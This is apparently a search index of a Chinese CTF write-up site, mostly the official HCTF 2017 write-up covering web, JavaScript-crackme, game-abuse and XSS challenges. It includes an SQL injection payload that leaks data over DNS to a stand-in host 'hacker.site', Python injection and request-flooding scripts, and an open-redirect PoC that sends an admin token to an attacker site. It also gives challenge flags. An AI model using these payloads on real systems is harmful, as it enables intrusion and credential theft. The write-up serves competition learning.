{"./":{"url":"./","title":"介绍","keywords":"","body":"站点介绍 宗旨： 本站致力于收集各类CTF题的Writeup，以方便各位师傅们进行学习。 官方群 点我加群 :)群号: 937886410 感谢： 在此鸣谢对本站点提供帮助的朋友们(Issue、分享wp等)。以下排名不分前: ID 贡献 ID 贡献 Yunen 创始人 西瓜_Melon 提交WP 说明： 本站所有文章均来源于网上搜索查询和网友分享，如果您有更好的Writeup想分享，欢迎email我的邮箱(asp-php@foxmail.com)，如果损害了您的利益，请尽快联系我，确保在24小时之内进行删除。 "},"types/":{"url":"types/","title":"按类型区分","keywords":"","body":"按类型区分 按照赛题区分 类型 数量 网上练习题 1 官方赛事题 7 "},"types/web.html":{"url":"types/web.html","title":"网上练习题","keywords":"","body":"网上练习题 按照添加时间倒序排序 添加时间 名称 2019-04-15 实验吧web部分 "},"types/comp.html":{"url":"types/comp.html","title":"官方赛事题","keywords":"","body":"官方赛事题 按照添加时间倒序排序 添加时间 名称 2019-04-27 2017HCTF 2019-04-26 2018第二届强网杯线上赛Web 2019-04-26 2018DDCTF滴滴夺旗赛 2019-04-18 2019全国大学生信息安全大赛 2019-04-18 2019DDCTF滴滴高校闯关赛 2019-04-16 2017全国信安赛 2019-04-15 2019西湖论剑预选赛 "},"years/":{"url":"years/","title":"按年份区分","keywords":"","body":"按年份区分 将WP按年份区分可让我们更好的去猜测出题人的命题思路。 时间 数量 2019-2020 3 2018-2019 2 2017-2018 2 2016-2017 0 2015-2016 0 ????-2015 1 "},"years/2020.html":{"url":"years/2020.html","title":"2019-2020","keywords":"","body":"2019-2020 2019-2020的CTF 添加时间 名称 2019-04-22 2019全国大学生信息安全大赛 2019-04-18 2019DDCTF滴滴高校闯关赛 2019-04-15 2019西湖论剑预选赛 "},"years/2019.html":{"url":"years/2019.html","title":"2018-2019","keywords":"","body":"2018-2019 2018-2019年的CTF 添加时间 名称 2019-04-26 2018第二届强网杯线上赛Web 2019-04-26 2018DDCTF "},"years/2018.html":{"url":"years/2018.html","title":"2017-2018","keywords":"","body":"2017-2018 2017-2018年的CTF 添加时间 名称 2019-04-27 2017HCTF 2019-04-16 2017全国大学生信息安全竞赛 "},"years/2017.html":{"url":"years/2017.html","title":"2016-2017","keywords":"","body":"2016-2017 2016-2017年的CTF 添加时间 名称 "},"years/2016.html":{"url":"years/2016.html","title":"2015-2016","keywords":"","body":"2015-2016 "},"years/2015.html":{"url":"years/2015.html","title":"????-2015","keywords":"","body":"????-2015 未知年份及2015年(包含)之前的CTF 添加时间 名称 2019-04-15 实验吧web部分 "},"difficult/":{"url":"difficult/","title":"按难度区分","keywords":"","body":"按难度区分 按照难度区分，更方便不同层次的师傅学习 难度 数量 较易 1 中等 5 较难 2 "},"difficult/easy.html":{"url":"difficult/easy.html","title":"相对简单","keywords":"","body":"相对简单 按照添加时间倒序排序 添加时间 名称 2019-04-15 实验吧web部分 "},"difficult/mid.html":{"url":"difficult/mid.html","title":"难度中等","keywords":"","body":"难度中等 按照添加时间倒序排序 添加时间 名称 2019-04-26 2018DDCTF滴滴夺旗赛 2019-04-22 2019全国大学生信息安全大赛 2019-04-18 2019DDCTF滴滴高校闯关赛 2019-04-15 2017全国信安赛 2019-04-15 2019西湖论剑预选赛 "},"difficult/diff.html":{"url":"difficult/diff.html","title":"难度较大","keywords":"","body":"难度较大 按照添加时间倒序排序 添加时间 名称 2019-04-27 2017HCTF 2019-04-26 2018第二届强网杯线上赛Web "},"articals/all.html":{"url":"articals/all.html","title":"目前已收录","keywords":"","body":"目前已收录 时间按照新旧排序，欢迎提交好的Writeup 时间 名称 2019-04-27 2017HCTF 2019-04-26 2018第二届强网杯线上赛Web 2019-04-26 2018DDCTF 2019-04-22 2019全国信安赛 2019-04-18 2019DDCTF 2019-04-16 2017全国信安赛 2019-04-15 2019西湖论剑预选赛 2019-04-15 实验吧web部分 评论区 请文明评论，禁止广告 "},"articals/2017hctf.html":{"url":"articals/2017hctf.html","title":"2017HCTF","keywords":"","body":"2017HCTF 题目类型： 类型 年份 难度 官方赛事题 2017 难 题目下载： https://github.com/vidar-team/HCTF2017 网上公开WP： https://xz.aliyun.com/t/1589 https://www.52pojie.cn/thread-662919-1-1.html 本站备份WP： 官方WP 前言: HCTF2017 Quals在11月12日正式落下帷幕了，我们很高兴HCTF的不断进步被人们看在眼里，HCTF2017第一次登陆CTFTIME，参加比赛并获得分数的队伍超过540只。 从HCTF创办以来，HCTF一直践行着做更好更棒的CTF比赛的准则，从2015年的反作弊系统、全新的比赛机制，到2016年的动态积分制，HCTF一直在努力将CTF变得更像一个hack game！ 今年我们第一次引入了分方向的闯关机制，将比赛题目分为 bin、web和 extra 三个大类，每一大类有五关，只有满足每关的开放条件，才能开放该关。 尽管规则导致的结果不竟如人意，但我们仍然进步，HCTF仍在变得更好。 Web easy_sign_in 这个题目真的真的非常简单，连提示都非常的明显就是去查看证书的内容。 从证书中我们可以得到一条flag in: 123.206.81.217 或许有些浏览器显示的位置不一定是这样. 打开123.206.81.217 就可以看到 flag: hctf{s00000_e4sy_sign_in} boring website 首先扫目录发现有www.zip,下载并打开发现是源码 \"; echo \"flag is hctf{what you get}\"; error_reporting(E_ALL^E_NOTICE^E_WARNING); try { $conn = new PDO( \"sqlsrv:Server=*****;Database=not_here\",\"oob\", \"\"); } catch( PDOException $e ) { die( \"Error connecting to SQL Server\".$e->getMessage() ); } #echo \"Connected to MySQL\"; echo \"Connected to SQL Server\"; $id = $_GET\\['id'\\]; if(preg_match('/EXEC|xp\\_cmdshell|sp\\_configure|xp_reg(.*)|CREATE|DROP|declare |if|insert|into|outfile|dumpfile|sleep|wait|benchmark/i', $id)) { die('NoNoNo'); } $query = \"select message from not\\_here\\_too where id = $id\"; //link server: O n linkname:mysql $stmt = $conn->query( $query ); if ( @$row = $stmt->fetch( PDO::FETCH_ASSOC ) ){ //TO DO: ... //It's time to sleep... } ?> 发现应该是sql server用linkserver来连接mysql。所以去查了一波linkserver的用法，以及结合注释可得select * from openquery(mysql,'select xxx')可以从mysql数据库中查得信息，但是没有回显，sleep函数也被ban了，然后看到oob的提示，去查了一波mysql out-of-band，发现load_file函数可以通过dns通道把所查得的数据带出来。接下来的过程就是十分常见简单的mysql注入的流程。最终的payload: /?id=1 union select * from openquery(mysql,'select load_file(concat(\"\\\\\\\\\",(select password from secret),\".hacker.site\\\\a.txt\"))') dnslog 平台可以自己搭也可以用ceye mysql out of band babycrack babycrack Description just babycrack 1.flag.substr(-5,3)==\"333\" 2.flag.substr(-8,1)==\"3\" 3.Every word makes sence. 4.sha256(flag)==\"d3f154b641251e319855a73b010309a168a12927f3873c97d2e5163ea5cbb443\" Now Score 302.93 Team solved 45 还是很抱歉题目的验证逻辑还是出现了不可逆推的问题，被迫在比赛中途加入4个hint来修复问题，下面我们来慢慢看看代码。 整个题目由反调试+代码混淆+逻辑混淆3部分组成，你可以说题目毫无意义完全为了出题而出题，但是这种代码确实最最真实的前端代码，现在许多站点都会选择使用反调试+混淆+一定程度的代码混淆来混淆部分前端代码。 出题思路主要有两篇文章： http://www.jianshu.com/p/9148d215c119https://zhuanlan.zhihu.com/p/29214928 整个题目主要是在我分析chrome拓展后门时候构思的，代码同样经过了很多重的混淆，让我们来一步步解释。 反调试 第一部分是反调试，当在页面内使用F12来调试代码时，会卡死在debugger代码处。 这里举个例子就是蘑菇街的登陆验证代码。 具体代码是这样的 eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('(3(){(3 a(){7{(3 b(2){9((\\'\\'+(2/2)).5!==1||2%g===0){(3(){}).8(\\'4\\')()}c{4}b(++2)})(0)}d(e){f(a,6)}})()})();',17,17,'||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20'.split('|'),0,{})); 美化一下 (function () { (function a() { try { (function b(i) { if (('' + (i / i)).length !== 1 || i % 20 === 0) { (function () {}).constructor('debugger')() } else { debugger } b(++i) })(0) } catch (e) { setTimeout(a, 5000) } })() })(); 这就是比较常见的反调试。我这里提供3种办法来解决这步。 1、使用node做代码调试。由于这里的debugger检测的是浏览器的调试，如果直接对代码调试就不会触发这样的问题。 2、静态分析因为题目中代码较少，我没办法把代码混入深层逻辑，导致代码可以纯静态分析。 3、patch debugger函数由于debugger本身智慧触发一次，不会无限制的卡死调试器，这里会出现这种情况，主要是每5s轮询检查一次。那么我们就可以通过patch settimeout函数来绕过。 window._setTimeout = window.setTimeout; window.setTimeout = function () {}; 这里可以用浏览器插件TamperMonkey解决问题。 除了卡死debug以外，我还加入了轮询刷新console的代码。 setInterval(\"window.console.log('Welcome to HCTF :>')\", 50); 同样的办法可以解决，就不多说了。 代码混淆 在去除掉这部分无用代码之后，我们接着想办法去除代码混淆。 这里最外层的代码混淆，我是通过https://github.com/javascript-obfuscator/javascript-obfuscator做了混淆。 ps:因为我在代码里加入了es6语法，市面上的很多工具都不支持es6语法，会导致去混淆的代码语法错误！ 更有趣的是，这种混淆是不可逆的，所以我们只能通过逐渐去混淆的方式来美化代码。 我们可以先简单美化一下代码格式 (function (_0xd4b7d6, _0xad25ab) { var _0x5e3956 = function (_0x1661d3) { while (--_0x1661d3) { _0xd4b7d6['push'](_0xd4b7d6['shift']()); } }; _0x5e3956(++_0xad25ab); }(_0x180a, 0x1a2)); var _0xa180 = function (_0x5c351c, _0x2046d8) { _0x5c351c = _0x5c351c - 0x0; var _0x26f3b3 = _0x180a[_0x5c351c]; return _0x26f3b3; }; function check(_0x5b7c0c) { try { var _0x2e2f8d = ['code', _0xa180('0x0'), _0xa180('0x1'), _0xa180('0x2'), 'invalidMonetizationCode', _0xa180('0x3'), _0xa180('0x4'), _0xa180('0x5'), _0xa180('0x6'), _0xa180('0x7'), _0xa180('0x8'), _0xa180('0x9'), _0xa180('0xa'), _0xa180('0xb'), _0xa180('0xc'), _0xa180('0xd'), _0xa180('0xe'), _0xa180('0xf'), _0xa180('0x10'), _0xa180('0x11'), 'url', _0xa180('0x12'), _0xa180('0x13'), _0xa180('0x14'), _0xa180('0x15'), _0xa180('0x16'), _0xa180('0x17'), _0xa180('0x18'), 'tabs', _0xa180('0x19'), _0xa180('0x1a'), _0xa180('0x1b'), _0xa180('0x1c'), _0xa180('0x1d'), 'replace', _0xa180('0x1e'), _0xa180('0x1f'), 'includes', _0xa180('0x20'), 'length', _0xa180('0x21'), _0xa180('0x22'), _0xa180('0x23'), _0xa180('0x24'), _0xa180('0x25'), _0xa180('0x26'), _0xa180('0x27'), _0xa180('0x28'), _0xa180('0x29'), 'toString', _0xa180('0x2a'), 'split']; var _0x50559f = _0x5b7c0c[_0x2e2f8d[0x5]](0x0, 0x4); var _0x5cea12 = parseInt(btoa(_0x50559f), 0x20); eval(function (_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2) { _0x2d59cf = function (_0x4be75f) { return _0x4be75f['toString'](_0x177f13); }; if (!'' ['replace'](/^/, String)) { while (_0x46da6f--) _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f); _0x802d91 = [function (_0x5e8f1a) { return _0x2829f2[_0x5e8f1a]; }]; _0x2d59cf = function () { return _0xa180('0x2b'); }; _0x46da6f = 0x1; }; while (_0x46da6f--) if (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[_0xa180('0x2c')](new RegExp('\\x5cb' + _0x2d59cf(_0x46da6f) + '\\x5cb', 'g'), _0x802d91[_0x46da6f]); return _0x200db2; }(_0xa180('0x2d'), 0x11, 0x11, _0xa180('0x2e')['split']('|'), 0x0, {})); (function (_0x3291b7, _0xced890) { var _0xaed809 = function (_0x3aba26) { while (--_0x3aba26) { _0x3291b7[_0xa180('0x4')](_0x3291b7['shift']()); } }; _0xaed809(++_0xced890); }(_0x2e2f8d, _0x5cea12 % 0x7b)); var _0x43c8d1 = function (_0x3120e0) { var _0x3120e0 = parseInt(_0x3120e0, 0x10); var _0x3a882f = _0x2e2f8d[_0x3120e0]; return _0x3a882f; }; var _0x1c3854 = function (_0x52ba71) { var _0x52b956 = '0x'; for (var _0x59c050 = 0x0; _0x59c050 > 0x3)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5) & 0x7) > 0x6)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x1) & 0x3f) >> 0x1)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x1) & 0x1) > 0x4)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x2) & 0xf) > 0x7)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x3) & 0x7f) >> 0x2)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x3) & 0x3) > 0x5)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')](_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x4) & 0x1f)); } var _0x545c12 = 0x0; if (_0x4ee491 == 0x1) _0x545c12 = 0x6; else if (_0x4ee491 == 0x2) _0x545c12 = 0x4; else if (_0x4ee491 == 0x3) _0x545c12 = 0x3; else if (_0x4ee491 == 0x4) _0x545c12 = 0x1; for (_0x1e1753 = 0x0; _0x1e1753 _0xffcc52[_0x43c8d1('f')]() * _0x76e1e8[0x1][_0x43c8d1(0x8)]; l = h(j[0x0], k); if (l != 0x2f9b5072) { return ![]; } m = _0x1c3854(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x0, 0x4)) - 0x48a05362 == n % l; function _0x5a6d56(_0x5a25ab, _0x4a4483) { var _0x55b09f = ''; for (var _0x508ace = 0x0; _0x508ace 代码里主要有几点混淆： 1、变量名替换，a --> _0xd4b7d6，这种东西最烦，但是也最简单，批量替换，在我看来即使abcd这种变量也比这个容易读 2、提取了所有的方法到一个数组，这种也简单，只要在chrome中逐步调试替换就可以了。 还有一些小的细节，很常见，没什么可说的 \"s\".length() --> \"s\"['length']() 最终代码可以优化到这个地步，基本已经可读了，下一步就是分析代码了。 function check(flag){ var _ = ['\\x63\\x6f\\x64\\x65', '\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e', '\\x65\\x72\\x72\\x6f\\x72', '\\x64\\x6f\\x77\\x6e\\x6c\\x6f\\x61\\x64', '\\x69\\x6e\\x76\\x61\\x6c\\x69\\x64\\x4d\\x6f\\x6e\\x65\\x74\\x69\\x7a\\x61\\x74\\x69\\x6f\\x6e\\x43\\x6f\\x64\\x65', '\\x54\\x6a\\x50\\x7a\\x6c\\x38\\x63\\x61\\x49\\x34\\x31', '\\x4b\\x49\\x31\\x30\\x77\\x54\\x77\\x77\\x76\\x46\\x37', '\\x46\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e', '\\x72\\x75\\x6e', '\\x69\\x64\\x6c\\x65', '\\x70\\x79\\x57\\x35\\x46\\x31\\x55\\x34\\x33\\x56\\x49', '\\x69\\x6e\\x69\\x74', '\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x74\\x68\\x65\\x2d\\x65\\x78\\x74\\x65\\x6e\\x73\\x69\\x6f\\x6e\\x2e\\x63\\x6f\\x6d', '\\x6c\\x6f\\x63\\x61\\x6c', '\\x73\\x74\\x6f\\x72\\x61\\x67\\x65', '\\x65\\x76\\x61\\x6c', '\\x74\\x68\\x65\\x6e', '\\x67\\x65\\x74', '\\x67\\x65\\x74\\x54\\x69\\x6d\\x65', '\\x73\\x65\\x74\\x55\\x54\\x43\\x48\\x6f\\x75\\x72\\x73', '\\x75\\x72\\x6c', '\\x6f\\x72\\x69\\x67\\x69\\x6e', '\\x73\\x65\\x74', '\\x47\\x45\\x54', '\\x6c\\x6f\\x61\\x64\\x69\\x6e\\x67', '\\x73\\x74\\x61\\x74\\x75\\x73', '\\x72\\x65\\x6d\\x6f\\x76\\x65\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72', '\\x6f\\x6e\\x55\\x70\\x64\\x61\\x74\\x65\\x64', '\\x74\\x61\\x62\\x73', '\\x63\\x61\\x6c\\x6c\\x65\\x65', '\\x61\\x64\\x64\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72', '\\x6f\\x6e\\x4d\\x65\\x73\\x73\\x61\\x67\\x65', '\\x72\\x75\\x6e\\x74\\x69\\x6d\\x65', '\\x65\\x78\\x65\\x63\\x75\\x74\\x65\\x53\\x63\\x72\\x69\\x70\\x74', '\\x72\\x65\\x70\\x6c\\x61\\x63\\x65', '\\x64\\x61\\x74\\x61', '\\x74\\x65\\x73\\x74', '\\x69\\x6e\\x63\\x6c\\x75\\x64\\x65\\x73', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f', '\\x6c\\x65\\x6e\\x67\\x74\\x68', '\\x55\\x72\\x6c\\x20\\x65\\x72\\x72\\x6f\\x72', '\\x71\\x75\\x65\\x72\\x79', '\\x66\\x69\\x6c\\x74\\x65\\x72', '\\x61\\x63\\x74\\x69\\x76\\x65', '\\x66\\x6c\\x6f\\x6f\\x72', '\\x72\\x61\\x6e\\x64\\x6f\\x6d', '\\x63\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x41\\x74', '\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65', '\\x70\\x61\\x72\\x73\\x65']; var head = flag['substring'](0, 4); var base = parseInt(btoa(head), 0x20); //344800 (function (b, c) { var d = function (a) { while (--a) { b['push'](b['shift']()) } }; d(++c); }(_, base%123)); var g = function (a) { var a = parseInt(a, 0x10); var c = _[a]; return c; }; var s2h = function(str){ var result = \"0x\"; for(var i=0;i> 3)); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5) & 0x07) > 6))); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 1) & 0x3F) >> 1))); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 1) & 0x01) > 4))); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 2) & 0x0F) > 7))); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 3) & 0x7F) >> 2))); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 3) & 0x03) > 5))); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 4) & 0x1F)))); } var replace = 0; if (leftover == 1) replace = 6; else if (leftover == 2) replace = 4; else if (leftover == 3) replace = 3; else if (leftover == 4) replace = 1; for (i = 0; i str['charCodeAt']()*b[1]['length']; l = h(j[0],k); if(l!=0x2f9b5072){ return false; } m = s2h(b[4]['substr'](0,4))-0x48a05362 == n%l; function u(str, j){ var result = \"\"; for(var i=0;i剩下的代码已经没什么可说的了。 1、首先是确认flag前缀，然后按照_分割为5部分。 2、g函数对基础数组做了一些处理，已经没什么懂了。 3、s2h是字符串到hex的转化函数 4、第一部分的验证不完整，导致严重的多解，只能通过爆破是否符合sha256来解决。 5、后面引入的b2c函数很简单，测试就能发现是一个base32函数。 6、第三部分和第四部分最简单，异或可得 7、h函数会对输入的字符串每位做func函数处理，然后拼接起来。 8、第二部分由3分割，左右两边长度相等，同样可以推算出结果。 9、k是我专门加入的es6语法的箭头语法，对传入的每个字母做乘7操作。 10、最后一题通过简单的判断，可以确定最后一部分的前四位。 11、u函数返回指定字符串的指定前几位 12、剩下的就是一连串的条件: 13、首先是一些很关键的的重复位，由于我写错了一些东西，导致这里永远是false，后被迫给出这几位.!m || u(b[4]['substr'](5,1),2) == b[4]['substr'](-5,4) || (b[4]['substr'](-2,1) - b[4]['substr'](4,1)) != 1 14、最后一部分是集合长度、以及部分条件完成的，看上去存在多解，但事实上是能逆向出来结果的。 当我们都完成这部分的时候，flag就会被我们解出来了。 poker 这次想以游戏安全出一些题目，但是又担心出的太难，大家没做过类似的游戏漏洞挖掘(其实是为了偷懒)，就出了一道战斗频率没有限制的刷级漏洞。这是一个去掉充值功能以外完整的游戏，我去掉了后台对于加速器的检测机制。提示给的很明显，在flag.php里提示了 getFlag when you are at level 100!!! 升到一百级就可以拿到flag，但是比赛时间的48个小时正常情况下不吃不喝也是升不到100级的，ctf本来就是一个hack game，所以需要分析他的游戏机制。这个版本的poker2没有战斗频率限制，可以高速无限战斗，脚本很简单，但是还需要分析游戏的细节。众多野怪地图里有一个叫圣诞小屋的挂机地图，伤害低经验高，写好挂机脚本还是很简单的。 import requests import re from time import sleep host = \"petgame.2017.hctf.io\" headers = { \"Cookie\":\"PHPSESSID=c4gn8hav06nsv43bo65tlfkto3\" } def getFight(host, headers): url = \"http://\"+host+\"/function/Fight_Mod.php?p=37&bid=5226&rd=0.5365947475076844\" req = requests.get(url = url, headers = headers) html = req.content gid = re.findall(\"gg=\\[.*,(.*)\\]\",html) if len(gid)>0: gid = gid[0] attack(gid, 4, host, headers) else: return False def attack(gid, times, host, headers): url = \"http://\"+host+\"/function/FightGate.php?id=1&g=\"+str(gid)+\"&checkwg=checked&rd=0.34966725314993186\" for i in xrange(0,times-1): req = requests.get(url = url, headers = headers) html = req.content print html while True: getFight(host,headers) # sleep(0.1) #attack(86,url,headers) 其实还有其他解法，就是在poker-poker一题中找到注入点，如果有一百级的玩家的密码是弱口令(md5可查)则可以进入其他人账号获得flag。我特意把poker2一题放在第二层，poker-poker在第三层，但是还是有人找到了非预期的注入点(注册处)，提前获取了别人的session，在我删除一百级账号前获得flag。 poker-poker 这题就比较难受了，看了大家传上来的wp，没有一份是预期解。由于游戏程序比较多，我也没全部看过，就找了一处隐蔽的有回显注入点，但是有一些前置条件。题目提示是pspt，访问发现跳转到pspt/并且状态403，说明存在pspt目录。pspt目录下存在robots.txt。 Disallow: /pspt/inf/queryUserRole.php Sitemap: http://domain.com/sitemap.xml 直接访问/pspt/inf/queryUserRole.php提示error1。该目录下存在.bak文件，泄漏了源码。 getOneRecord(\"SELECT id,nickname FROM player WHERE name = '{$_GET['user_account']}'\"); if (!is_array($arr)) { die('error4'); } $str = $arr['id'].'&'.$arr['nickname']; $newstr = iconv('utf8','utf-8',$str); echo $newstr; unset($time,$arr,$str); ?> 此处泄漏了encryKey，只要有这个encryKey，我们可以根据源码写出注入payload。poc: import requests import time import hashlib import urllib2 def getMd5(data): data = str(data) t = hashlib.md5() t.update(data) return t.hexdigest() def hack(payload=\"admin\"): user_account = urllib2.quote(payload) valid_date = int(time.time())+10000 sign = getSign(user_account, valid_date) url = \"http://petgame.2017.hctf.io/pspt/inf/queryUserRole.php?user_account=\"+str(user_account)+\"&valid_date=\"+str(valid_date)+\"&sign=\"+sign req = requests.get(url = url) print req.content def getSign(user_account, valid_date): user_account = urllib2.unquote(user_account) encryKey = '7sl+kb9adDAc7gLuv31MeEFPBMJZdRZyAx9eEmXSTui4423hgGfXF1pyM' sign = getMd5(str(user_account) + str(valid_date) + encryKey) return sign hack(\"adminss' union all select 111,flag from hctf.flag2#\") flag就在hctf库里的hctf2表里。而大家找到的其他注入点 A World Restored & A World Restored Again A World Restored Description: nothing here or all the here ps:flag in admin cookie flag is login as admin URL http://messbox.2017.hctf.io Now Score 674.44 Team solved 7 A World Restored Again Description: New Challenge !! hint: flag only from admin bot URL http://messbox.2017.hctf.io Now Score 702.6 Team solved 6 A World Restored在出题思路本身是来自于uber在10月14号公开的一个漏洞https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html，为了能尽可能的模拟真实环境，我这个不专业的Web开发只能强行上手实现站库分离。 其中的一部分非预期，也都是因为站库分离实现的不好而导致的。（更开放的题目环境，导致了很多可能，或许这没什么不好的？ 整个站的结构是这样的：1、auth站负责用户数据的处理，包括登陆验证、注册等，是数据库所在站。2、messbox站负责用户的各种操作，但不连接数据库。 这里auth站与messbox站属于两个完全不同的域，受到同源策略的影响，我们就需要有办法来沟通两个站。 而这里，我选择使用token做用户登陆的校验+jsonp来获取用户数据。站点结构如下: 简单来说就是，messbox登陆账号完全受到token校验，即使你在完全不知道账号密码的情况下，获取该token就可以登陆账号。 那么怎么获取token登陆admin账号就是第一题。 而第二题，漏洞点就是上面文章中写的那样，反射性的domxss，可以得到服务端的flag。 为了两个flag互不干扰，我对服务端做了一定的处理，服务端负责处理flag的代码如下： $flag1 = \"hctf{xs5_iz_re4lly_complex34e29f}\"; $flag2 = \"hctf{mayb3_m0re_way_iz_best_for_ctf}\"; if(!empty($_SESSION['user'])){ if($_SESSION['user'] === 'hctf_admin_LoRexxar2e23322'){ setcookie(\"flag\", $flag, time()+3600*48,\" \",\"messbox.2017.hctf.io\", 0, true); } if($_SESSION['user'] === 'hctf_admin_LoRexxar2e23322' && $_GET['check']==\"233e\"){ setcookie(\"flag2\", $flag2, time()+3600*48,\" \",\".2017.hctf.io\"); } } 可以很明显的看出来，flag1是httponly并在messbox域下，只能登陆才能查看。flag2我设置了check位，只有bot才会访问这个页面，这样只有通过反射性xss，才能得到flag。 下面我们回到题目。 A World Restored A World Restored Description: nothing here or all the here ps:flag in admin cookie flag is login as admin URL http://messbox.2017.hctf.io Now Score 674.44 Team solved 7 这道题目在比赛结束时，只有7只队伍最终完成了，非常出乎我的意料，因为漏洞本身非常有意思。（这个漏洞是ROIS发现的） 为了能够实现token，我设定了token不可逆的二重验证策略，但是在题目中我加入了一个特殊的接口，让我们回顾一下。 auth域中的login.php，我加入了这样一段代码 if(!empty($_GET['n_url'])){ $n_url = trim($_GET['n_url']); echo \"window.location.href='\".$n_url.\"?token=\".$usertoken.\"'\"; exit; }else{ // header(\"location: http://messbox.hctf.com?token=\".$usertoken); echo \"window.location.href='http://messbox.2017.hctf.io?token=\".$usertoken.\"'\"; exit; } 这段代码也是两个漏洞的核心漏洞点，假设你在未登录状态下访问messbox域下的user.php或者report.php这两个页面，那么因为未登录，页面会跳转到auth域并携带n_url，如果获取到登陆状态，这里就会拼接token传回messbox域，并赋予登陆状态。 简单的流程如下： `未登录->获取当前URL->跳转至auth->获取登陆状态->携带token跳转到刚才获取的URL->messbox登陆成功` 当然，这其中是有漏洞的。 服务端bot必然登陆了admin账号，如果我们直接请求login.php并制定下一步跳转的URL，那么我们就可以获取拼接上的token！ poc `http://auth.2017.hctf.io/login.php?n_url=http://{you_website}` 得到token我们就可以登陆messbox域，成功登陆admin A World Restored Again A World Restored Again Description: New Challenge !! hint: flag only from admin bot URL http://messbox.2017.hctf.io Now Score 702.6 Team solved 6 到了第二部，自然就是xss了，其实题目本身非常简单，在出题之初，为了避免题目出现“垃圾时间”（因为非预期导致题目不可解），我在题目中加入了跟多元素。 并把flag2放置在.2017.hctf.io域下，避免有人找到messbox的xss但是打不到flag的问题。（没想到真的用上了） 这里我就简单描述下预期解法和非预期解法两个。 预期解法 预期解法当然来自于出题思路。 https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html 漏洞本身非常简单，但有意思的是利用思路。 当你发现了一个任意URL跳转的漏洞，会不会考虑漏洞是怎么发生的？ 也许你平时可能没注意过，但跳转一般是分两种的，第一种是服务端做的，利用header: location,这种跳转我们没办法阻止。第二种是js使用location.href导致的跳转。 既然是js实现的，那么是不是有可能存在dom xss漏洞呢？ 这个uber的漏洞由来就是如此。 这里唯一的考点就是，js是一种顺序执行的语言，如果location报错，那么就不会继续执行后面的js，如果location不报错，那么就可能在执行下一句之前跳转走。 当然，办法很多。最普通的可能是在location后使用stop()来阻止跳转，但最好用的就是新建script块，这样上一个script报错不会影响到下一个script块。 最终payload 非预期解法 除了上面的漏洞以外，messbox也有漏洞，username在首页没有经过任何过滤就显示在了页面内。 但username这里漏洞会有一些问题，因为本身预期的漏洞点并不是这里，所以这里的username经过我框架本身的一点儿过滤，而且长度有限制，所以从这里利用的人会遇到很多非预期的问题。 payload如下，注册名为 的用户名，并获取token。 传递 http://messbox.2017.hctf.io/?token=NDYyMGZlMTNhNWM3YTAxY3xQSE5qY21sd2RDQnpjb U05THk5aGRYUm9Makl3TVRjdWFHTjBaaTVwYnk5blpYUnRaWE56WVdkbExuQm9jRDlqWVd4c1ltR mphejFzYjJOaGRHbHZiajBsTWpkb2RIUndPaTh2Y205dmRHc3VjSGN2SlRJM0pUSmlZblJ2WVNoa 2IyTjFiV1Z1ZEM1amIyOXJhV1VwT3k4dlBqd3ZjMk55YVhCMFBnPT0= 即可 SQL Silencer 有些假过滤，简化一下贴出注入部分最重要部分的代码 function sql_check($sql){ if($sql 3){ die('We only have 3 users.'); } $check = preg\\_match('/&|\\_|\\\\+|or|,|and| |\\\\|\\\\||#|-|`|;|\"|\\\\'|\\\\*|into|union(\\[\\\\s\\\\S\\]+)select(\\[\\\\s\\\\S\\]+)from/i',$sql); if( $check ){ die(\"Nonono!\"); } else { return $sql; } } 这道题其实是可以显注的，各位有兴趣的可以先去试试然而由于是黑名单不全的原因，几乎所有队伍都是用盲注做出来的当前数据库有2个表，一个user，一个flaguser表里有3条数据，flag表里也有2条数据所以有队伍在子查询中测试select(flag)from(flag)会返回there is nothing从而怀疑flag表不存在因为数据库中会报错：ERROR 1242 (21000): Subquery returns more than 1 row 